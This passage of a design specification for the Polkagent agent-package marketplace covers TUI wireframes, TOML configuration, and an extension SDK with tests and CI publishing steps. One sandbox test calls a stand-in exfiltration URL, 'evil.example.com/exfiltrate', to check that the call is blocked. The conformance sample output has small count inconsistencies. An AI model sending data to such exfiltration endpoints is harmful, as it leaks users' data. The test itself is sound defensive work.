| Task / package table with status icons | `/Users/will/dev/nunchi/roko/roko/crates/roko-cli/src/tui/views/atelier_view.rs` (`render_plan_detail`) | — | `[ ]` / `[>]` / `[x]` / `[!]` icons; 4-column `Table` with fixed + min constraints; `Row::new` with per-cell style. |
| Skill catalog table with version + metrics | — | `/Users/will/dev/uniswap/bardo/apps/bardo-terminal/src/screens/command/skills.rs` | `SkillDisplay` struct with `name`, `version`, `category`, `confidence`, `invocation_count`, `is_bloodstained`; semver validation helper; summary line above table; background refresh task via `watch` channel. |
| Progress bar for in-flight operations | `/Users/will/dev/nunchi/roko/roko/crates/roko-cli/src/tui/views/marketplace_view.rs` (`render_job_detail`) | — | `█` filled / `░` empty block characters; `[filled][empty] N%` format; agent ID suffix. |
| Empty state messaging | Both `marketplace_view.rs` and `atelier_view.rs` | `skills.rs` | Centered `Paragraph` with muted style; actionable hint on the line below. |
| Keybinding hint bar | Both `marketplace_view.rs` and `atelier_view.rs` | — | `Span::styled("key", accent)` + `Span::styled(":action  ", muted)` pattern; `Alignment::Center`. |
| Context-sensitive action prompts | `/Users/will/dev/nunchi/roko/roko/crates/roko-cli/src/tui/views/atelier_view.rs` (`action_lines` match on status) | — | Status-gated action hints (`p:publish`, `g:gen plan`); inline CLI command examples in the detail panel. |

---

## APPENDIX E: TUI SURFACE FOR MARKETPLACE

This appendix defines the TUI surfaces for Polkagent's marketplace. Patterns
are drawn directly from the reference files identified in Appendix D.

### E.1 Marketplace browser

**Layout:** 35% left panel (package list) | 65% right panel (package detail).
Mirrors the exact layout from `marketplace_view.rs` line 74:
`Layout::horizontal([Constraint::Percentage(35), Constraint::Percentage(65)])`.

**Keyboard bindings:**

| Key | Action |
|---|---|
| `j` / `k` | Navigate list (wraps) |
| `Enter` | Focus detail panel |
| `/` | Open search filter input |
| `t` | Cycle trust tier filter (all → signed → verified → curated) |
| `c` | Cycle category filter |
| `i` | Install selected package |
| `r` | Refresh from registry |
| `n` | New package (go to Atelier) |
| `?` | Toggle keybinding help |

**ASCII wireframe:**

```
┌─ Marketplace (47) ──────────────────────────────────────────────────────────────────────────────────┐
│ Filter: [all types] [verified+] [governance]   Search: [treasury__________]                         │
├─ Packages (12) ─────────────────┬─ treasury-monitor ──────────────────────────────────────────────  │
│  VRFD treasury-monitor     1.0  │ treasury-monitor v1.0.0                              [VRFD] ★4.7  │
│  VRFD governance-scout     1.3  │ Example Team  •  Apache-2.0  •  1,247 installs                   │
│▶ CRTD openGov-toolkit      2.1  │                                                                    │
│  SIGN vote-helper          0.9  │ Monitor treasury proposals and spending on Polkadot                │
│  VRFD referendum-reader    1.1  │ and Kusama.                                                        │
│  UNSN experimental-kit     0.1  │                                                                    │
│  VRFD chain-reader-tool    2.0  │ Capabilities:                                                      │
│  VRFD polkadot-id-check    1.5  │   [REQ] network: rpc.polkadot.io, rpc.kusama.network              │
│  SIGN address-validator    1.2  │   [REQ] chain_read: polkadot, kusama → Treasury, Referenda        │
│  VRFD balance-checker      1.0  │                                                                    │
│  VRFD fee-estimator        1.3  │ Dependencies:  polkadot-chain-profile v1.2.3  openGov-schema v2.1 │
│  CRTD governance-kit       3.0  │                                                                    │
│                                 │ Trust:  ✓ Polkadot identity  ✓ domain:example.com  ✓ SLSA L2     │
│                                 │ Audit:  ExampleSec Ltd  2026-07-15  (0 crit, 0 high)              │
│                                 │ Compat: ✓ macOS ARM  ✓ Linux x86_64  ✓ wasm32                    │
│                                 │ Vulns:  none known                                                 │
│                                 │                                                                    │
│                                 │  i:install  v:versions  r:reviews  a:audit  ?:help               │
└─────────────────────────────────┴────────────────────────────────────────────────────────────────────┘
```

**List row format** (derived from `marketplace_view.rs` `render_job_list`):

```rust
// Trust badge: fixed 4 chars, colored by tier.
let badge = match trust_tier {
    TrustTier::Unsigned  => ("UNSN", theme.danger()),
    TrustTier::Signed    => ("SIGN", theme.warning()),
    TrustTier::Verified  => ("VRFD", theme.info()),
    TrustTier::Curated   => ("CRTD", theme.success()),
};

// Type indicator: 3-char abbreviation.
let type_abbrev = match package_type {
    PackageType::Skill        => "skl",
    PackageType::Tool         => "tol",
    PackageType::ContextPack  => "ctx",
    PackageType::ProductKit   => "kit",
    _                         => "pkg",
};

ListItem::new(Line::from(vec![
    Span::styled(format!(" {} ", badge.0), badge.1),
    Span::styled(format!("[{}] ", type_abbrev), theme.muted()),
    Span::styled(truncate(&package.name, avail_width - 6), row_style),
    Span::styled(format!(" {}", package.version), theme.muted()),
]))
```

### E.2 Package detail view

**Layout:** fixed-height metadata table (8 rows) + scrollable description +
capabilities section + trust section + install button bar.

**ASCII wireframe:**

```
┌─ treasury-monitor v1.0.0 ────────────────────────────────────────────────────────────────────────────┐
│ name:        treasury-monitor                                                                         │
│ version:     1.0.0  (latest: 1.0.0)  [check updates]                                                 │
│ publisher:   Example Team  [VRFD]  polkadot:5Example...  example.com                                 │
│ type:        skill                                                                                    │
│ license:     Apache-2.0                                                                               │
│ published:   2026-07-30                                                                               │
│ installs:    1,247  rating: ★4.7/5 (89 reviews)                                                      │
│ compat:      ✓ macOS ARM  ✓ Linux x86_64  ✓ wasm32-wasip2                                            │
├─ Description ────────────────────────────────────────────────────────────────────────────────────────┤
│ Monitor treasury proposals and spending on Polkadot and Kusama. Tracks proposal lifecycle,            │
│ spending amounts, beneficiaries, and governance votes. Outputs structured reports.                    │
├─ Capabilities ───────────────────────────────────────────────────────────────────────────────────────┤
│ [REQUIRED] network       rpc.polkadot.io, rpc.kusama.network, *.parity.io                            │
│            reason:       Query treasury and governance state from RPC endpoints.                      │
│ [REQUIRED] chain_read    polkadot, kusama → Treasury, Referenda, Identity, Balances                  │
│            reason:       Read treasury proposal state, spending, and linked identities.               │
├─ Trust & Security ───────────────────────────────────────────────────────────────────────────────────┤
│ Trust tier:  VERIFIED                                                                                 │
│ Identity:    ✓ Polkadot:5Example...  ✓ domain:example.com                                            │
│ Signing:     cosign v3 keyless  •  Rekor #123456789  •  SLSA Build L2                               │
│ Audit:       ExampleSec Ltd  2026-07-15  scope: full source v1.0.0                                   │
│              findings: 0 critical  0 high  0 medium  2 low (all resolved)                            │
│ Advisories:  none known                                                                               │
├──────────────────────────────────────────────────────────────────────────────────────────────────────┤
│  i:install    v:versions    r:reviews    d:dependencies    Esc:back                                  │
└──────────────────────────────────────────────────────────────────────────────────────────────────────┘
```

### E.3 Atelier / workshop (package creation and testing)

Adapted from `atelier_view.rs`. Layout: top stats bar (3 lines) + left 40%
(package list) + right 60% (package detail with tasks and actions).

**Stats bar** (mirrors `render_stats_bar`):

```
┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐
│  Packages: 3    Published: 1    Tasks: 7/12    Build: ✓    Tests: 5/12 passing                      │
└─────────────────────────────────────────────────────────────────────────────────────────────────────┘
```

**ASCII wireframe (full atelier view):**

```
┌─ Packages: 3  Published: 1  Tasks: 7/12  Build: ✓  Tests: 5/12 passing ────────────────────────────┐
├─ My Packages (3) ───────────────┬─ treasury-monitor ──────────────────────────────────────────────  │
│  PUBL treasury-monitor  1.0 7/9 │ slug:     treasury-monitor                                        │
│▶ DRFT gov-alert-skill   0.2 0/4 │ type:     skill                                                    │
│  IDEA spending-kit      ---     │ status:   draft  [p:publish]                                       │
│                                 │ tasks:    0/4  (0%)                                                 │
│                                 │ version:  0.2.0                                                     │
│                                 │                                                                     │
│                                 │ Actions:                                                            │
│                                 │   polkagent package build                                           │
│                                 │   polkagent package test --all                                      │
│                                 │   polkagent package publish --registry default                      │
│                                 │                                                                     │
│                                 ├─ Tasks (4) ──────────────────────────────────────────────────────  │
│                                 │     id    title                        status                       │
│                                 │ [ ] t-001 Write manifest               pending                      │
│                                 │ [ ] t-002 Implement prompts            pending                      │
│                                 │ [ ] t-003 Write conformance tests      pending                      │
│                                 │ [ ] t-004 Sign and publish             pending                      │
│                                 │                                                                     │
│                                 │  b:build  t:test  p:publish  n:new pkg  r:refresh                  │
└─────────────────────────────────┴────────────────────────────────────────────────────────────────────┘
```

**Package list row format** (derived from `atelier_view.rs` `render_prd_list`):

```rust
let badge = match status {
    PackageDraftStatus::Idea      => ("IDEA", theme.muted()),
    PackageDraftStatus::Draft     => ("DRFT", theme.warning()),
    PackageDraftStatus::Published => ("PUBL", theme.success()),
    PackageDraftStatus::Testing   => ("TEST", theme.info()),
};

let progress = if task_total > 0 {
    format!(" {}/{}", task_done, task_total)
} else {
    String::new()
};
```

**New package form** (derived from `render_create_job` in `marketplace_view.rs`):

Fields: Name, Type (enum picker), Version, Description, License (picker),
Capabilities (multi-select), Repository URL. Each field: bordered block,
accent border on focus, warning border while editing, block cursor in editing
mode. `Tab` → next field, `Enter` → edit, `Ctrl-S` → create, `Esc` → cancel.

### E.4 Skill browser

Adapted from Bardo's `skills.rs` (`SkillsScreen`). Renders a table of all
installed skills with per-skill metrics.

**ASCII wireframe:**

```
┌─ MARKETPLACE / Installed Skills ────────────────────────────────────────────────────────────────────┐
│ Skills: 8    Invocations (total): 3,412    Attention: 1 stained                                     │
├──────────────────────────────────────────────────────────────────────────────────────────────────────┤
│ Name                     Version   Category    Confidence  Invocations  Status                       │
│ governance-scout         1.3.2     governance  94%         1,247        active                        │
│ treasury-monitor         1.0.0     governance  87%         892          active                        │
│ referendum-summary       1.0.1     governance  91%         673          active                        │
│ address-validator        1.2.0     identity    99%         412          active                        │
│ balance-checker          1.0.3     defi        85%         103          active                        │
│ fee-estimator            1.3.1     defi        88%         67           active                        │
│ runtime-diff             2.0.1     developer   79%         15           active                        │
│ contract-tester          0.9.0     developer   61%         3            ⚔ STAINED                    │
├──────────────────────────────────────────────────────────────────────────────────────────────────────┤
│  Enter:details  u:update  x:uninstall  i:install-new  r:refresh  ?:help                             │
└──────────────────────────────────────────────────────────────────────────────────────────────────────┘
```

**Column definitions** (derived from `SkillDisplay` in `skills.rs`):

| Column | Source field | Width | Style |
|---|---|---|---|
| Name | `SkillDisplay::name` | `Min(10)` | `theme.text()` |
| Version | `SkillDisplay::version` | `Length(9)` | `theme.muted()` |
| Category | `SkillDisplay::category` | `Length(12)` | type color (governance=info, defi=warning, developer=muted) |
| Confidence | `SkillDisplay::confidence_pct()` | `Length(11)` | `theme.success()` if > 80%, `theme.warning()` if 50–80%, `theme.danger()` if < 50% |
| Invocations | `SkillDisplay::invocation_count` | `Length(12)` | `theme.muted()` |
| Status | `SkillDisplay::status_label()` | `Length(12)` | `theme.success()` if active, `theme.danger()` if stained |

**Background refresh** (mirrors `spawn_skills_refresh_task` from `skills.rs`):

```rust
/// Spawns a background task that refreshes the installed-skills list
/// from the local package database every 30 seconds.
pub fn spawn_installed_skills_refresh(
    tx: tokio::sync::watch::Sender<Vec<InstalledSkillDisplay>>,
    db: Arc<PackageDatabase>,
) {
    tokio::spawn(async move {
        let interval = tokio::time::Duration::from_secs(30);
        loop {
            let skills = db.list_installed_skills().await
                .unwrap_or_default()
                .into_iter()
                .map(InstalledSkillDisplay::from)
                .collect();
            if tx.send(skills).is_err() {
                break;
            }
            tokio::time::sleep(interval).await;
        }
    });
}
```

### E.5 Installed packages manager

**Layout:** full-width table with filter bar at top. Lists all installed
packages across all types.

**ASCII wireframe:**

```
┌─ Installed Packages (11) ──── Filter: [all types ▼] [active ▼] ────────────────────────────────────┐
│ Name                     Type       Version   Trust   Status    Updated       Size                   │
│ governance-scout         skill      1.3.2     VRFD    active    2026-07-28    —                      │
│ treasury-monitor         skill      1.0.0     VRFD    active    2026-07-30    —                      │
│ chain-reader-tool        tool       2.1.0     VRFD    active    2026-07-25    2.4 MB                 │
│ openGov-schema           ctx_pack   2.1.0     VRFD    active    2026-07-20    —                      │
│ polkadot-chain-profile   ctx_pack   1.2.3     VRFD    active    2026-07-15    —                      │
│ address-validator        tool       1.2.0     SIGN    active    2026-07-10    1.1 MB                 │
│ balance-checker          tool       1.0.3     VRFD    active    2026-07-18    0.8 MB                 │
│ my-custom-tool           tool       0.1.0     UNSN    active    2026-07-30    3.2 MB (sideloaded)    │
│ contract-tester          skill      0.9.0     SIGN    disabled  2026-06-01    —                      │
│ governance-scout-kit     kit        1.0.0     CRTD    active    2026-07-28    —                      │
│ polkadot-core-model      mod_cfg    1.1.0     VRFD    active    2026-07-01    —                      │
├──────────────────────────────────────────────────────────────────────────────────────────────────────┤
│  u:update-all  Enter:details  x:uninstall  d:disable  g:grant-cap  r:revoke-cap  c:check-updates    │
└──────────────────────────────────────────────────────────────────────────────────────────────────────┘
```

### E.6 Publisher dashboard

**Layout:** stats bar + left 30% (package list) + right 70% (package detail
with metrics and actions). Accessed from `polkagent marketplace dashboard`.

**ASCII wireframe:**

```
┌─ Publisher: Example Team  [VRFD]  polkadot:5Example...  example.com ────────────────────────────────┐
│  Packages: 3    Total installs: 2,142    Avg rating: 4.6    Revenue this month: $342.00              │
├─ My Packages (3) ───────────────┬─ treasury-monitor v1.0.0 ─────────────────────────────────────────│
│  treasury-monitor  1.0.0  1247  │ Installs:      1,247  (+23 this week)                             │
│  governance-scout  1.3.2   892  │ Rating:        ★4.7/5  (89 reviews)                               │
│  openGov-schema    2.1.0     3  │ Revenue:       $187.00 this month                                 │
│                                 │ Last publish:  2026-07-30                                          │
│                                 │ Vulnerabilities: none known                                        │
│                                 │ Trust tier:    VERIFIED                                            │
│                                 │                                                                    │
│                                 │ Actions:                                                           │
│                                 │   polkagent package publish --registry default                     │
│                                 │   polkagent package yank treasury-monitor@1.0.0                    │
│                                 │   polkagent package unpublish treasury-monitor@1.0.0               │
│                                 │                                                                    │
│                                 │  p:publish  y:yank  e:edit-metadata  s:settings  r:refresh        │
└─────────────────────────────────┴────────────────────────────────────────────────────────────────────┘
```

---

## APPENDIX F: CONFIGURATION GUIDE

All Polkagent marketplace and registry configuration is managed in
`~/.config/polkagent/config.toml` (user-scope) or
`/etc/polkagent/config.toml` (system-scope). System scope takes precedence.
Operators can override any user-scope setting.

### F.1 Registry URL configuration

```toml
[registry]
# The default registry used when no registry is specified in a dependency or command.
default = "https://registry.polkadot.network/api/v1"

# Named registries. Refer to these by name in dependency specs.
[registry.named]
company-internal = "https://registry.internal.example.com/api/v1"
polkadot-community = "https://registry.polkadot-community.org/api/v1"

# Registry-specific authentication (token stored in system keychain by default).
# [registry.auth]
# "https://registry.internal.example.com/api/v1" = { method = "bearer", token_env = "POLKAGENT_REGISTRY_TOKEN" }

# Search order when no registry is specified. Registries are queried in order.
# First registry to return a result wins for metadata; all registries are checked for trust signals.
search_order = ["default", "polkadot-community", "company-internal"]

# Federation: enable to allow the local registry to fan out searches to peers.
[registry.federation]
enabled = true
timeout_ms = 3000
```

### F.2 Trust settings

```toml
[trust]
# Minimum trust tier required to install without an explicit --trust flag.
# Validation: enum { unsigned, signed, verified, curated }
# "unsigned" means any package can be installed (explicit warnings still shown).
# "curated" is the most restrictive: only curated packages install without override.
minimum_install_tier = "signed"

# Whether to require explicit --trust unsigned for unverified packages.
# true = operator must pass --trust unsigned on CLI; false = just show warning.
require_explicit_unsigned = true

# Whether to display verification details in the install prompt.
show_verification_details = true

# Trusted publisher identities: packages from these publishers skip the
# standard install prompt and proceed directly (still capability-reviewed).
# Caution: use only for known, internal publishers.
# trusted_publishers = ["example-team", "polkagent-core"]

# Pinned signer identities for cosign v3 keyless verification.
# If set, only packages whose cosign certificate subject matches one of these
# are accepted. Unmatched packages require --trust-signer-override.
[trust.pinned_signers]
"treasury-monitor" = "https://github.com/example/treasury-monitor/.github/workflows/publish.yml@refs/heads/main"
# Add more per-package pins here.
```

### F.3 Auto-update policies

```toml
[updates]
# How often to check for updates. Duration string.
check_interval = "6h"

# Auto-update policy per version change type.
# Validation: enum { never, prompt, auto }
patch_updates = "auto"    # Apply patch updates automatically.
minor_updates = "prompt"  # Prompt for minor updates.
major_updates = "never"   # Never auto-apply major updates.

# Whether capability-changing updates always require explicit review,
# regardless of the patch/minor/major policy.
# Strongly recommended: true.
capability_change_requires_review = true

# Packages excluded from auto-updates (always prompt or manual).
# exclude = ["treasury-monitor", "chain-reader-tool"]

# Pre-release update policy.
# true = include pre-release versions in update checks.
include_prerelease = false

[updates.notifications]
# How to deliver update notifications.
# Validation: enum { cli, log, webhook }
methods = ["cli", "log"]
# webhook_url = "https://hooks.example.com/polkagent-updates"
```

### F.4 Sandbox permissions

```toml
[sandbox]
# Default sandbox tier override. If set, all packages run in at least this tier.
# Validation: enum { context_only, process, wasm, container }
# Omit to use the tier selected by select_sandbox_tier (section 8.2).
# minimum_tier = "wasm"

# Resource limit defaults. Individual packages may declare lower limits;
# the operator limit is the ceiling.
[sandbox.limits]
max_cpu_seconds            = 30
max_memory_mb              = 256
max_network_requests       = 100
max_network_bandwidth_mb   = 10
max_filesystem_read_mb     = 100
max_filesystem_write_mb    = 10
max_concurrent_operations  = 10
max_invocations_per_hour   = 1000

# Wasmtime metering configuration (applies to Tier 2 WASM sandbox).
[sandbox.wasm]
# Fuel budget per invocation. Set to 0 to disable (not recommended for untrusted).
fuel_per_invocation = 10_000_000_000
# Epoch deadline in milliseconds (wall clock). Requires background ticker thread.
epoch_deadline_ms = 30_000
# Maximum linear memory in pages (1 page = 64 KB).
max_memory_pages = 4096   # = 256 MB

# Per-package sandbox overrides.
# [sandbox.packages]
# "chain-reader-tool" = { max_cpu_seconds = 60, max_memory_mb = 512 }
```

### F.5 Sideload directories

```toml
[sideload]
# Directories scanned for sideloaded packages at startup.
# Each directory is expected to contain subdirectories, each with a
# polkagent.manifest.toml. All packages found are registered with
# trust tier "unsigned" unless a local signature is present.
directories = [
  "/opt/polkagent/local-packages/",
  "~/.polkagent/local-packages/",
]

# Whether to auto-activate sideloaded packages found in the directories above.
# false = packages are installed but not activated until explicitly enabled.
auto_activate = false

# Whether to watch directories for changes and reload on modification.
# Useful for development workflows.
watch = false
watch_debounce_ms = 500
```

### F.6 License policy

```toml
[policy.licenses]
# SPDX expressions for allowed licenses. Empty list = allow all.
allowed = ["Apache-2.0", "MIT", "BSD-2-Clause", "BSD-3-Clause", "ISC", "MPL-2.0"]

# SPDX expressions for denied licenses. Takes precedence over allowed.
denied = ["GPL-3.0-only", "AGPL-3.0-only", "SSPL-1.0"]

# Action when a package's license is not in the allowed list.
# Validation: enum { allow, warn, deny }
unknown_action = "warn"
```

### F.7 Auto-approval policy for CI/CD

```toml
[policy.auto_approve]
# Enable headless auto-approval (no interactive prompt).
# Requires trust and capability constraints below to be satisfied.
enabled = false

# Minimum trust tier for auto-approval.
trust_tier_minimum = "verified"

# Capability categories that may be auto-approved.
allowed_capabilities = ["network", "chain_read", "filesystem"]

# Capability categories that always require interactive review.
review_required_capabilities = ["chain_write", "economic", "process_spawn", "secret_read"]

# Publisher allow-list for auto-approval.
# publishers_allowed = ["example-team", "polkagent-core"]

# Publisher deny-list (takes precedence over allowed).
# publishers_denied = []
```

---

## APPENDIX G: EXTENSION SDK

### G.1 SDK structure

The Extension SDK is published as a set of Rust crates in the `polkagent-sdk`
workspace. Third-party crate registries (crates.io) host public releases.

```
polkagent-sdk/                   # Workspace root
├── Cargo.toml                   # Workspace manifest
├── crates/
│   ├── polkagent-sdk/           # Main crate — re-exports from all sub-crates
│   │   └── src/
│   │       ├── lib.rs           # pub use prelude::*; feature flags
│   │       └── prelude.rs       # Convenient re-exports
│   │
│   ├── polkagent-sdk-macros/    # Procedural macros
│   │   └── src/
│   │       ├── lib.rs           # #[polkagent_tool], #[polkagent_skill], #[polkagent_kit]
│   │       ├── tool.rs          # Derive codegen for PolkagentTool
│   │       └── codegen.rs       # Manifest-driven type and WIT generation
│   │
│   ├── polkagent-sdk-types/     # Shared types (no executable code)
│   │   └── src/
│   │       ├── manifest.rs      # PackageManifest, CapabilitySet, etc.
│   │       ├── capability.rs    # Capability enum and enforcement types
│   │       ├── trust.rs         # TrustTier, PublisherIdentity
│   │       ├── classification.rs # DataClassification label types
│   │       └── schema.rs        # JsonSchema-derived input/output types
│   │
│   ├── polkagent-sdk-testing/   # Test framework and mocks
│   │   └── src/
│   │       ├── lib.rs
│   │       ├── mock_context.rs  # MockToolContext: configurable capability grants
│   │       ├── sandbox.rs       # TestSandbox: runs package in isolated env
│   │       ├── fixtures.rs      # Fixture loading helpers
│   │       └── assertions.rs    # Domain-specific assertion macros
│   │
│   └── polkagent-sdk-wasm/      # WASM compilation support
│       └── src/
│           ├── lib.rs
│           ├── host.rs          # WASM host-side API bindings
│           └── guest.rs         # WASM guest-side bindings (compiled into tool)
│
└── wit/
    └── polkagent-tool-1.0.0/
        ├── polkagent-tool.wit   # WIT world definition (see section 14.4)
        └── deps/
            └── ...              # WIT dependencies
```

**`Cargo.toml` for a new tool package:**

```toml
[package]
name = "treasury-monitor"
version = "1.0.0"
edition = "2024"

[lib]
crate-type = ["cdylib"]    # For WASM compilation.

[dependencies]
polkagent-sdk = { version = "0.4", features = ["wasm"] }

[dev-dependencies]
polkagent-sdk = { version = "0.4", features = ["wasm", "testing"] }
tokio = { version = "1", features = ["full"] }

[profile.release]
opt-level = "s"        # Optimize for size in WASM output.
lto = true
codegen-units = 1
```

### G.2 Template generator (`cargo-polkagent-extension`)

The `cargo-polkagent-extension` subcommand extends Cargo to provide first-class
extension creation:

```bash
# Install the generator (once)
cargo install cargo-polkagent-extension

# Create a new skill
cargo polkagent-extension new --type skill my-governance-skill

# Create a new tool
cargo polkagent-extension new --type tool my-chain-reader

# Create a new product kit
cargo polkagent-extension new --type kit my-governance-kit

# Create from an existing template
cargo polkagent-extension new --type tool --template rpc-query-tool my-custom-reader

# List available templates
cargo polkagent-extension templates list
```

**Generated directory for a tool (`cargo polkagent-extension new --type tool my-chain-reader`):**

```
my-chain-reader/
├── Cargo.toml                      # Package manifest with polkagent-sdk dependency
├── polkagent.manifest.toml         # Pre-populated package manifest (tool type)
├── src/
│   └── lib.rs                      # Tool struct with #[polkagent_tool] macro
├── schemas/
│   ├── input.json                  # JSON Schema for tool input (auto-generated from manifest)
│   └── output.json                 # JSON Schema for tool output
├── tests/
│   ├── unit_tests.rs               # Unit tests using MockToolContext
│   └── conformance_tests.rs        # SDK conformance test suite
├── fixtures/
│   └── test_data/
│       ├── valid_input.json        # Sample valid input
│       └── expected_output.json    # Expected output for the sample input
├── docs/
│   └── README.md                   # Usage documentation template
└── .polkagent/
    └── dev.toml                    # Development configuration (local sandbox settings)
```

**Generated `lib.rs` for a tool:**

```rust
use polkagent_sdk::prelude::*;

/// Replace this with your tool's description.
/// This doc comment becomes the tool's description in the registry.
#[polkagent_tool]
pub struct MyChainReader;

#[async_trait]
impl PolkagentTool for MyChainReader {
    type Input = MyChainReaderInput;
    type Output = MyChainReaderOutput;

    fn metadata(&self) -> ToolMetadata {
        // Metadata is derived from polkagent.manifest.toml at compile time.
        // Do not edit this method manually; edit polkagent.manifest.toml instead.
        tool_metadata_from_manifest!()
    }

    async fn invoke(
        &self,
        input: MyChainReaderInput,
        ctx: &ToolContext,
    ) -> Result<MyChainReaderOutput, ToolError> {
        // Implement your tool logic here.
        // Use ctx.chain_query(...) for chain state reads.
        // Use ctx.http_request(...) for network requests.
        // All calls are checked against your declared capabilities.
        todo!("Implement MyChainReader")
    }
}

// Input type: edit fields to match your tool's needs.
// This struct is validated against schemas/input.json at compile time.
#[derive(Deserialize, JsonSchema)]
pub struct MyChainReaderInput {
    /// The query to execute.
    pub query: String,
}

// Output type: edit fields to match your tool's output.
// This struct is validated against schemas/output.json at compile time.
#[derive(Serialize, JsonSchema)]
pub struct MyChainReaderOutput {
    /// The result of the query.
    pub result: serde_json::Value,
}
```

### G.3 Testing framework for extensions

The SDK provides three layers of testing:

#### G.3.1 Unit testing with `MockToolContext`

```rust
use polkagent_sdk::testing::{MockToolContext, MockChainResponse};

#[tokio::test]
async fn test_treasury_balance_query() {
    let tool = TreasuryMonitor;

    // Configure the mock context with specific capability grants.
    let ctx = MockToolContext::new()
        .with_capability(Capability::ChainRead {
            networks: vec!["polkadot".into()],
            pallets: vec!["Treasury".into()],
        })
        // Return a mock chain query result.
        .with_chain_response(
            "Treasury.Proposals",
            MockChainResponse::json(serde_json::json!({
                "proposals": [
                    { "id": 1, "value": "1000000000000", "beneficiary": "5Example..." }
                ]
            })),
        );

    let result = tool.invoke(
        TreasuryMonitorInput { network: "polkadot".into(), max_proposals: 10 },
        &ctx,
    ).await.unwrap();

    assert_eq!(result.proposals.len(), 1);
    assert_eq!(result.proposals[0].id, 1);
}

#[tokio::test]
async fn test_undeclared_capability_denied() {
    let tool = TreasuryMonitor;

    // Context with NO capabilities granted.
    let ctx = MockToolContext::new();

    let result = tool.invoke(
        TreasuryMonitorInput { network: "polkadot".into(), max_proposals: 10 },
        &ctx,
    ).await;

    // Must fail with CapabilityDenied, not panic or hang.
    assert!(matches!(result, Err(ToolError::CapabilityDenied(_))));
}
```

#### G.3.2 Sandbox integration testing with `TestSandbox`

```rust
use polkagent_sdk::testing::TestSandbox;

#[tokio::test]
async fn test_network_isolation() {
    let sandbox = TestSandbox::from_manifest("./polkagent.manifest.toml")
        .with_fuel(10_000_000)
        .with_epoch_deadline(std::time::Duration::from_secs(10));

    // Allowed: declared host.
    let ok = sandbox.invoke_tool(
        serde_json::json!({ "network": "polkadot", "max_proposals": 5 })
    ).await;
    assert!(ok.is_ok(), "Declared host should be accessible");

    // Denied: undeclared host (sandbox must block this).
    let denied = sandbox.invoke_http(
        "https://evil.example.com/exfiltrate",
        serde_json::json!({}),
    ).await;
    assert!(
        matches!(denied, Err(polkagent_sdk::SandboxError::CapabilityDenied(_))),
        "Undeclared host must be blocked by sandbox"
    );
}

#[tokio::test]
async fn test_fuel_exhaustion() {
    let sandbox = TestSandbox::from_manifest("./polkagent.manifest.toml")
        .with_fuel(100);  // Very small fuel budget.

    let result = sandbox.invoke_tool(
        serde_json::json!({ "network": "polkadot", "max_proposals": 1000 })
    ).await;

    // Must terminate cleanly with fuel exhaustion, not crash.
    assert!(matches!(result, Err(polkagent_sdk::SandboxError::FuelExhausted)));
}
```

#### G.3.3 Conformance test suite

Run the SDK's built-in conformance suite against your package:

```bash
# Run all conformance checks
polkagent package test --conformance

# Output:
# Conformance: treasury-monitor v1.0.0
# [PASS] manifest_valid              Manifest parses with no validation errors.
# [PASS] capabilities_complete       No host calls to undeclared capabilities.
# [PASS] resource_compliant          Memory and CPU within declared limits.
# [PASS] input_schema_valid          All test inputs conform to schemas/input.json.
# [PASS] output_schema_valid         All test outputs conform to schemas/output.json.
# [PASS] sandbox_isolation           No escape from declared capability scope.
# [PASS] error_handling              Invalid inputs return ToolError, not panic.
# [WARN] determinism_check           Non-deterministic output detected (chain state may vary).
#
# 7/7 checks passed (1 warning).
```

The conformance suite checks are also run automatically by the registry at
publication time. A package with failing conformance checks is published with
a `conformance_warnings` flag visible on its listing page.

### G.4 Publishing workflow

#### G.4.1 Full publish pipeline

```bash
# 1. Validate the manifest
polkagent package validate

# 2. Build (compiles Rust to WASM if applicable, generates schemas)
polkagent package build --release

# 3. Run all tests
polkagent package test --all
#    Runs: cargo test, conformance tests, sandbox integration tests.

# 4. Generate SLSA Build Level 2 provenance attestation
#    (Requires OIDC token from CI/CD environment)
polkagent package provenance generate --slsa-level 2

# 5. Sign with cosign v3 keyless (requires OIDC token — typically in CI)
polkagent package sign --keyless

# 6. Preview the publish (dry run — shows what would be published)
polkagent package publish --dry-run

# 7. Publish to the default registry
polkagent package publish

# 8. Verify the published package
polkagent package verify --registry default treasury-monitor@1.0.0
```

#### G.4.2 GitHub Actions workflow template

```yaml
# .github/workflows/publish.yml
name: Publish to Polkagent Registry

on:
  push:
    tags:
      - 'v*.*.*'

permissions:
  contents: read
  id-token: write   # Required for cosign keyless signing (OIDC).

jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Install Rust toolchain
        uses: dtolnay/rust-toolchain@stable
        with:
          targets: wasm32-wasip2

      - name: Install polkagent CLI
        run: cargo install polkagent-cli --locked

      - name: Install cosign
        uses: sigstore/cosign-installer@v3

      - name: Validate manifest
        run: polkagent package validate

      - name: Build package
        run: polkagent package build --release

      - name: Run all tests
        run: polkagent package test --all

      - name: Generate SLSA provenance
        run: polkagent package provenance generate --slsa-level 2

      - name: Sign package (cosign v3 keyless)
        run: polkagent package sign --keyless
        # The OIDC token is provided by GitHub Actions automatically.
        # The signer identity will be:
        # https://github.com/${{ github.repository }}/.github/workflows/publish.yml@${{ github.ref }}

      - name: Publish to registry
        run: polkagent package publish
        env:
          POLKAGENT_REGISTRY_TOKEN: ${{ secrets.POLKAGENT_REGISTRY_TOKEN }}
```

#### G.4.3 Version management commands

```bash
# Yank a version (remove from resolution while retaining content for existing installs)
polkagent package yank treasury-monitor@1.0.0 --reason "Critical bug in treasury query"

# Un-yank a version (re-include in resolution)
polkagent package unyank treasury-monitor@1.0.0

# View publication history
polkagent package history treasury-monitor

# Update package metadata without republishing content (description, docs URL, etc.)
polkagent package metadata update \
  --description "Updated description." \
  --documentation "https://docs.example.com/treasury-monitor/v2"

# Transfer ownership to another publisher identity
polkagent package transfer treasury-monitor \
  --to polkadot:5NewOwnerAddress... \
  --registry default
```

#### G.4.4 Conformance gates for CI

Add these checks to CI to catch issues before publish:

```bash
# In CI (before publish step):

# Gate 1: Manifest must be valid.
polkagent package validate || exit 1

# Gate 2: Conformance tests must pass (no failures; warnings allowed).
polkagent package test --conformance --fail-on-warnings || exit 1

# Gate 3: Capabilities declared in manifest must match capabilities used in code.
# (This is enforced at compile time by the proc-macro, but can also be checked
# statically against the WASM binary's import list.)
polkagent package audit --capability-honesty || exit 1

# Gate 4: No known vulnerabilities in dependencies.
polkagent package audit --vulnerabilities || exit 1

# Gate 5: License policy compliance.
polkagent package audit --licenses --policy ./policy.toml || exit 1
```
